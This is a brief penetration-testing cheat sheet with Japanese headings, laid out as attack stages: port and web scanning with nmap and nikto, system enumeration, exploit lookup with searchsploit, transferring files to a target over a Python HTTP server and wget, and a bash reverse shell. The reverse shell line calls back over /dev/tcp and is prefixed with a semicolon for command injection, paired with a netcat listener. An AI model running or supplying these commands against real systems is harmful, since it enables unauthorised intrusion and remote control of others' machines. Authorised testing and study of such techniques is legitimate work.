
## Reconnaissance

ポート確認

    nmap -v -p- -sV -sT -Pn [HOST]
    nmap -v -A [HOST]

Webサーバ

    nikto -h [HOST]

サーバ状態確認

    uname -a
    cat /etc/redhat-release
    cat /proc/version

exploitdb https://github.com/offensive-security/exploitdb

    searchsploit CentOS 4.0

## Delivery

転送

    python -m SimpleHTTPServer 9998
    wget http://address:9998/file


## Exploitation

bashリバースシェル http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

    nc -lvp 9999
    ;bash -i >& /dev/tcp/ip/9999 0>&1



